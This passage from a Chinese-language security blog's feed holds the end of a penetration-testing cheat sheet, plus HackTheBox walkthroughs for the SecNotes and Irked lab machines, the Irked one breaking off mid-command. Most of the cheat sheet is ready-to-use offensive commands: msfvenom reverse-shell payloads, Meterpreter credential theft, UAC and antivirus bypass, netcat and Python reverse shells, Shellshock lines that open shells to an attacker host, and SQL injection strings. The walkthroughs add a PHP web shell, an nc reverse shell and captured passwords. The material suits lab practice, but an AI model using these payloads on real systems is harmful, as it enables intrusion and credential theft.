-i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="center-Meterpreter-center"><center>Meterpreter</center></h2><h3 id="Windows">Windows</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><h3 id="Windows-VNV">Windows VNV</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/vncinject/reverse_tcp<br><br><span class="hljs-built_in">set</span> ViewOnly <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h3 id="Linux">Linux</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload linux/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><h3 id="msf备忘">msf备忘</h3><p>上传文件</p><p><code>upload file c:\\windows</code></p><p>下载文件</p><p><code>download c:\\windows\\repair\\sam /tmp</code></p><p>运行exe</p><p><code>execute -f c:\\windows\temp\exploit.exe</code></p><p>使用cmd shell创建新通道</p><p><code>execute -f cmd -c</code></p><p>端口转发</p><p><code>portfwd add –l 3389 –p 3389 –r target</code></p><p>关闭端口转发</p><p><code>portfwd delete –l 3389 –p 3389 –r target</code></p><p>Bypass UAC</p><p><code>use exploit/windows/local/bypassuac</code></p><p>HTTP目录扫描</p><p><code>use auxiliary/scanner/http/dir_scanner</code></p><p>扫描JBOSS漏洞</p><p><code>use auxiliary/scanner/http/jboss_vulnscan</code></p><p>扫描MSSQL密码</p><p><code>use auxiliary/scanner/mssql/mssql_login</code></p><p>扫描MSSQL版本</p><p><code>use auxiliary/scanner/mysql/mysql_version</code></p><p>Oracle登录模块</p><p><code>use auxiliary/scanner/oracle/oracle_login</code></p><p>powershell有效负载模块</p><p><code>use exploit/multi/script/web_delivery</code></p><p>通过会话上传和运行powershell脚本</p><p><code>post/windows/manage/powershell/exec_powershell</code></p><p>部署JBOSS</p><p><code>use exploit/multi/http/jboss_maindeployer</code></p><p>MSSQL有效负载</p><p><code>use exploit/windows/mssql/mssql_payload</code></p><p>显示当前用户的权限</p><p><code>run post/windows/gather/win_privs</code></p><p>抓取GPP保存的密码</p><p><code>use post/windows/gather/credentials/gpp</code></p><p>加载Mimikatz/kiwi并获得凭证</p><p><code>load kiwi</code></p><p><code>creds_all</code></p><p>识别所提供的域用户具有管理访问权限的其他计算机</p><p><code>run post/windows/gather/local_admin_search_enum</code></p><p><code>set AUTORUNSCRIPT post/windows/manage/migrate</code></p><h3 id="msf-payloads">msf payloads</h3><p>列出选项</p><p><code>msfvenom –l</code></p><h3 id="二进制">二进制</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f elf &gt; shell.elf<br><br>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f exe &gt; shell.exe<br><br>msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f macho &gt; shell.macho<br></code></pre></td></tr></table></figure><h3 id="Web-payloads">Web payloads</h3><p>PHP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p php/meterpreter/reverse_tcp LHOST= LPORT= -f raw &gt; shell.php<br><br><span class="hljs-built_in">cat</span> shell.php | pbcopy &amp;&amp; <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;&lt;?php &#x27;</span> | <span class="hljs-built_in">tr</span> -d <span class="hljs-string">&#x27;\n&#x27;</span> &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php<br></code></pre></td></tr></table></figure><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload php/meterpreter/reverse_tcp<br></code></pre></td></tr></table></figure><p>ASP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp &gt; shell.asp<br></code></pre></td></tr></table></figure><p>JSP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw &gt; shell.jsp<br></code></pre></td></tr></table></figure><p>WAR</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war &gt; shell.war<br></code></pre></td></tr></table></figure><h3 id="脚本-payloads">脚本 payloads</h3><p>Python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw &gt; shell.py<br></code></pre></td></tr></table></figure><p>Bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw &gt; shell.sh<br></code></pre></td></tr></table></figure><p>Perl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw &gt; shell.pl<br></code></pre></td></tr></table></figure><h3 id="shellcode">shellcode</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST= LPORT= -f<br><br>msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f<br><br>msfvenom -p osx/x86/shell_reverse_tcp LHOST= LPORT= -f<br></code></pre></td></tr></table></figure><h3 id="Handlers">Handlers</h3><p>msf常用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">exploit/multi/handler<br><br><span class="hljs-built_in">set</span> PAYLOAD<br><br><span class="hljs-built_in">set</span> LHOST<br><br><span class="hljs-built_in">set</span> LPORT<br><br><span class="hljs-built_in">set</span> ExitOnSession <span class="hljs-literal">false</span><br><br>exploit -j -z<br></code></pre></td></tr></table></figure><p><strong>Demo</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom exploit/multi/handler -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f &gt; exploit.extension<br></code></pre></td></tr></table></figure><h2 id="center-Powershell-center"><center>Powershell</center></h2><p>执行旁路</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Set-ExecutionPolicy Unrestricted<br>./file.ps1<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">Import-Module script.psm1<br>Invoke-FunctionThatIsIntheModule<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">iex(new-object system.net.webclient).downloadstring(“file:///C:\examplefile.ps1”)<br></code></pre></td></tr></table></figure><p>Powershell.exe被阻止</p><p>Use ‘not powershell’ <a href="https://github.com/Ben0xA/nps">https://github.com/Ben0xA/nps</a></p><h2 id="center-提权-center"><center>提权</center></h2><h3 id="Linux-2">Linux</h3><p><a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p><p><a href="https://github.com/pentestmonkey/unix-privesc-check">https://github.com/pentestmonkey/unix-privesc-check</a></p><h3 id="Windows-2">Windows</h3><p><a href="https://github.com/pentestmonkey/windows-privesc-check">https://github.com/pentestmonkey/windows-privesc-check</a></p><p><a href="http://www.fuzzysecurity.com/tutorials/16.html">http://www.fuzzysecurity.com/tutorials/16.html</a></p><p><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/">https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/</a></p><h2 id="center-命令行注入-center"><center>命令行注入</center></h2><h3 id="遍历文件">遍历文件</h3><p><code>website.com/file.php[?path=/]</code></p><h3 id="使用curl探测HTTP-options">使用curl探测HTTP options</h3><p><code>curl -vX OPTIONS [website]</code></p><h3 id="使用CURL将文件上传到具有PUT方法的网站">使用CURL将文件上传到具有PUT方法的网站</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl --upload-file shell.php --url http://192.168.218.139/test/shell.php --http1.0<br></code></pre></td></tr></table></figure><h3 id="传输文件">传输文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?path=/;wget http://IPADDRESS:8000/FILENAME.EXTENTION;<br></code></pre></td></tr></table></figure><h3 id="连接shell">连接shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">;php -f filelocation.php<br></code></pre></td></tr></table></figure><h2 id="center-SQL注入-center"><center>SQL注入</center></h2><h3 id="注入">注入</h3><p>登录表单的常见注入:</p><ul><li>admin’ –</li><li>admin’ #</li><li>admin’/*</li><li>’ or 1=1–</li><li>’ or 1=1#</li><li>’ or 1=1/*</li><li>') or ‘1’='1–</li><li>') or (‘1’='1—</li></ul><h3 id="SQLMap">SQLMap</h3><p>自动sqlmap扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://demo.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u http://INSERTIPADDRESS --dbms=mysql --crawl=3<br></code></pre></td></tr></table></figure><p>有针对性的sqlmap扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords --file-read=<span class="hljs-string">&quot;/var/www/blah.php&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -u <span class="hljs-string">&quot;http://meh.com/meh.php?id=1&quot;</span> --dbms=mysql --tech=U --random-agent --dump Scan url <span class="hljs-keyword">for</span> union + error based injection with mysql backend and use a random user agent + database dump<br></code></pre></td></tr></table></figure><p>sqlmap检查表单注入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -o -u <span class="hljs-string">&quot;http://meh.com/form/&quot;</span> –forms<br></code></pre></td></tr></table></figure><p>dump数据库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -o -u <span class="hljs-string">&quot;http://meh/vuln-form&quot;</span> --forms -D database-name -T <span class="hljs-built_in">users</span> –dump<br></code></pre></td></tr></table></figure><p>刷新会话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap --flush session<br></code></pre></td></tr></table></figure><p>尝试使用布尔技术来利用“用户”字段。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -p user --technique=B<br></code></pre></td></tr></table></figure><p>Post</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap -r demo.txt<br></code></pre></td></tr></table></figure><h2 id="其他">其他</h2><p><a href="http://xn--mitm6NTLMRelayx-2e8x1697beef.py">使用mitm6的NTLMRelayx.py</a></p><p>使用mitm6通过IPv6欺骗获取捕获的凭据，并通过ntlmrelayx.py将其转发到目标。它需要安装ntlmrelayx.py和mitm6。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mitm6 -d &lt;domain.local&gt;<br><br>ntlmrelayx.py -6 -wh 192.168.1.1 -t smb://192.168.1.2 -l ~/tmp/<br></code></pre></td></tr></table></figure><h3 id="隧道">隧道</h3><p>sshuttle是一个很棒的隧道工具，它摆脱了对代理链的需求。以下命令的作用是通过10.0.0.1隧道传输流量，并为通过sshuttle隧道发往10.10.10.0/24的所有流量建立路由。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sshuttle -r root@10.0.0.1 10.10.10.0/24<br></code></pre></td></tr></table></figure><h3 id="AV-Bypass">AV Bypass</h3><p>需要安装wine和hyperion。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wine hyperion.exe ../backdoor.exe ../backdoor_mutation.exe<br></code></pre></td></tr></table></figure><h3 id="Web主机（传输文件">Web主机（传输文件</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m SimpleHTTPServer 80<br></code></pre></td></tr></table></figure><h3 id="PHP-msf-shell">PHP msf shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p php/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=4444 R &gt; phpmeterpreter.php<br></code></pre></td></tr></table></figure><h3 id="Netcat-2">Netcat</h3><p>监听</p><p>nc -lvp <PORT></p><p>反弹</p><p>nc -e /bin/bash ip port</p><p>ncat -v -l -p 7777 -e /bin/bash</p><p>通过ncat下载文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> happy.txt | ncat -v -l -p 5555 <br>ncat localhost 5555 &gt; happy_copy.txt <br></code></pre></td></tr></table></figure><h3 id="使用解释器反弹shell">使用解释器反弹shell</h3><p><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p><p>Python</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c python -c <span class="hljs-string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.0.0.1&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;exec(\&quot;import socket, subprocess;s = socket.socket();s.connect((&#x27;127.0.0.1&#x27;,9000))\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\&quot;)&quot;</span><br></code></pre></td></tr></table></figure><h3 id="Shellshock">Shellshock</h3><p>CURL</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -x TARGETADDRESS -H <span class="hljs-string">&quot;User-Agent: () &#123; ignored;&#125;;/bin/bash -i &gt;&amp; /dev/tcp/HOSTIP/1234 0&gt;&amp;1&quot;</span> TARGETADDRESS/cgi-bin/status<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -x 192.168.28.167:PORT -H <span class="hljs-string">&quot;User-Agent: () &#123; ignored;&#125;;/bin/bash -i &gt;&amp; /dev/tcp/192.168.28.169/1234 0&gt;&amp;1&quot;</span> 192.168.28.167/cgi-bin/status<br></code></pre></td></tr></table></figure><p>SSH</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh username@IPADDRESS <span class="hljs-string">&#x27;() &#123; :;&#125;; /bin/bash&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>杂项</category>
      
    </categories>
    
    
    <tags>
      
      <tag>备忘录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTehBox-SecNotes</title>
    <link href="/posts/8e5dfaea.html"/>
    <url>/posts/8e5dfaea.html</url>
    
    <content type="html"><![CDATA[<h3 id="信息收集">信息收集</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -p- -sV 10.10.10.97<br></code></pre></td></tr></table></figure><p>开放了80、445、8808三个端口</p><p><img src="https://ae01.alicdn.com/kf/HTB1h2ejaBCw3KVjSZFl763JkFXaE.png" alt=""><br>访问80端口，是个登录页面，注册一个账号</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">user:<span class="hljs-string">&#x27; w&#x27;</span>or 1=<span class="hljs-string">&#x27;1</span><br><span class="hljs-string">pass:&#x27;</span> w<span class="hljs-string">&#x27;or 1=&#x27;</span>1<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1gWyfaCWD3KVjSZSg763CxVXaP.png" alt="s"></p><p>注册成功，使用【w’or 1='1】登录，发现第三个笔记疑似smb之类的账号密码</p><p><img src="https://ae01.alicdn.com/kf/HTB1w95larus3KVjSZKb760qkFXat.png" alt=""></p><p>使用 smbclient 尝试登录smb,用户：<code>Tyler</code>，密码：<code>92g!mA8BGjOirkL%OG*&amp;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient //10.10.10.97/new-site -U Tyler<br></code></pre></td></tr></table></figure><p>登录后发现该目录是web服务8808端口的根目录</p><p><img src="https://ae01.alicdn.com/kf/HTB1p4yjaBCw3KVjSZFu763AOpXa6.png" alt=""></p><h3 id="利用">利用</h3><p>上传一句话马</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">put x.php   <span class="hljs-comment">#注意，要把php放到当前运行目录下才能上传，不然不报错</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;x&#x27;</span>]))&#123;<br>  <span class="hljs-variable">$cmd</span> = (<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;x&#x27;</span>]);<br>  <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$cmd</span>);<br>  <span class="hljs-keyword">die</span>;<br> &#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1ycSdaEWF3KVjSZPh760clXXaF.png" alt=""></p><p>这里要注意的是，目标机好像不是很稳定，不是php马被删就是smb断开连接，所以下面上传个nc通过之前上传的php马执行反弹一个shell回来</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">10.10.10.97:8808</span>/atom.php?cmd=nc%<span class="hljs-number">2010</span>.<span class="hljs-number">10</span>.<span class="hljs-number">14</span>.<span class="hljs-number">24</span>%<span class="hljs-number">201337</span>%<span class="hljs-number">20</span>-e%<span class="hljs-number">20</span>cmd.exe<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1aDacawKG3KVjSZFL761MvXXaI.png" alt=""></p><p>在<code>wwwroot</code>目录下找到连接数据库文件<code>db.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$includes</span> != <span class="hljs-number">1</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ERROR: Should not access directly.&quot;</span>);<br>&#125;<br><br><span class="hljs-comment">/* Database credentials. Assuming you are running MySQL</span><br><span class="hljs-comment">server with default setting (user &#x27;root&#x27; with no password) */</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DB_SERVER&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DB_USERNAME&#x27;</span>, <span class="hljs-string">&#x27;secnotes&#x27;</span>);<br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;q8N#9Eos%JinE57tke72&#x27;</span>);<br><span class="hljs-comment">//define(&#x27;DB_USERNAME&#x27;, &#x27;root&#x27;);</span><br><span class="hljs-comment">//define(&#x27;DB_PASSWORD&#x27;, &#x27;qwer1234QWER!@#$&#x27;);</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;DB_NAME&#x27;</span>, <span class="hljs-string">&#x27;secnotes&#x27;</span>);<br><br><span class="hljs-comment">/* Attempt to connect to MySQL database */</span><br><span class="hljs-variable">$link</span> = <span class="hljs-title function_ invoke__">mysqli_connect</span>(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);<br>     <br><span class="hljs-comment">// Check connection</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$link</span> === <span class="hljs-literal">false</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;ERROR: Could not connect. &quot;</span> . <span class="hljs-title function_ invoke__">mysqli_connect_error</span>());<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>数据库连接文件暂时不管它了，先找<code>user.txt</code></p><p><img src="https://ae01.alicdn.com/kf/HTB1KeCdaECF3KVjSZJn762nHFXaf.png" alt=""></p><p>在桌面找到user.txt，还发现了个可疑的<code>bash.lnk</code>,运行该bash报错不存在，那就查找下真正路径在哪吧，找到完整路径后重新执行运行bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">where</span> /R c:\ bash.exe<br><br>c:\Windows\WinSxS\amd64_microsoft-windows-lxss-bash_31bf3856ad364e35_10.0.17134.1_none_251beae725bc7de5\bash.exe<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1lAijaBGw3KVjSZFD760WEpXaF.png" alt="secnotes8.png"></p><p>为了方便，使用python反弹个shell会话</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></code></pre></td></tr></table></figure><p>查看历史命令，发现曾经使用明文密码登录过smb</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">smbclient -U <span class="hljs-string">&#x27;administrator%u6!4ZwgwOM#^OBf#Nwnh&#x27;</span> \\\\127.0.0.1\\c$<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB1e9ueaBWD3KVjSZFs763qkpXaH.png" alt=""></p><p>登录smb，在桌面找到root.txt</p><p><img src="https://ae01.alicdn.com/kf/HTB1GlGdaA9E3KVjSZFG76319XXau.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>技术水文</category>
      
    </categories>
    
    
    <tags>
      
      <tag>靶机渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HackTheBox-Irked</title>
    <link href="/posts/ae29f7a1.html"/>
    <url>/posts/ae29f7a1.html</url>
    
    <content type="html"><![CDATA[<div class="yinyue" style="text-align:center"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=428642586&auto=1&height=66"></iframe></div><h3 id="信息收集">信息收集</h3><p>扫描目标机器开放的端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">masscan -p1-65535 10.10.10.117 --rate=1000 -e tun0 &gt; ports<br><br>ports=$(<span class="hljs-built_in">cat</span> ports | awk -F <span class="hljs-string">&quot; &quot;</span> <span class="hljs-string">&#x27;&#123;print $4&#125;&#x27;</span> | awk -F <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> | <span class="hljs-built_in">sort</span> -n | <span class="hljs-built_in">tr</span> ​<span class="hljs-string">&#x27;\n&#x27;</span>​ ​<span class="hljs-string">&#x27;,&#x27;</span>​ | sed <span class="hljs-string">&#x27;s/,$//&#x27;</span>)<br><br>nmap -Pn -A -sV -sC -p<span class="hljs-variable">$ports</span> 10.10.10.117<br></code></pre></td></tr></table></figure><p><img src="https://ae01.alicdn.com/kf/HTB17_edaEKF3KVjSZFE760ExFXaM.png" alt=""></p><p>目标机上运行着http服务，使用<code>gobuster</code>爆了下目录，没有发现什么。</p><p>访问下web站点，似乎发现了些什么，<code>IRC is almost working!</code>, 在回看nmap扫描输出信息<code>6697</code>和<code>8067</code>端口上就运行着<code>IRC</code></p><p><img src="https://ae01.alicdn.com/kf/HTB1u.OdaEuF3KVjSZK9762VtXXat.png" alt=""></p><h3 id="使用HexChat连接到目标机">使用HexChat连接到目标机</h3><p>nmap没探测出关于IRC更多的信息，所以使用hexchat连接目标，看看是否能找到其他信息。例如版本号之类的。</p><p>由于kali上没有 <code>HexChat</code> 所以先安装该工具</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">apt-get install hexchat -y<br></code></pre></td></tr></table></figure><p>启动 Hexchat 添加新连接</p><p><img src="https://ae01.alicdn.com/kf/HTB14uykaBCw3KVjSZR0762cUpXaq.png" alt=""></p><p>连接成功，版本是<code>Unreal 3.2.1</code>, 搜索一下该版本有什么漏洞</p><p><img src="https://ae01.alicdn.com/kf/HTB1enidavWG3KVjSZFP760aiXXaz.png" alt=""></p><p>搜索到以下几个漏洞</p><p><img src="https://ae01.alicdn.com/kf/HTB1__Omaq5s3KVjSZFN763D3FXal.png" alt=""></p><p><img src="https://ae01.alicdn.com/kf/HTB1QYKdaxiH3KVjSZPf760BiVXaC.png" alt=""></p><h3 id="漏洞利用">漏洞利用</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/unix/irc/unreal_ircd_3281_backdoor<br><span class="hljs-built_in">set</span> payload cmd/unix/reverse_perl<br><span class="hljs-built_in">set</span> RHOST 10.10.10.117  <span class="hljs-comment">#目标</span><br><span class="hljs-built_in">set</span> RPORT 6697          <span class="hljs-comment">#目标端口</span><br><span 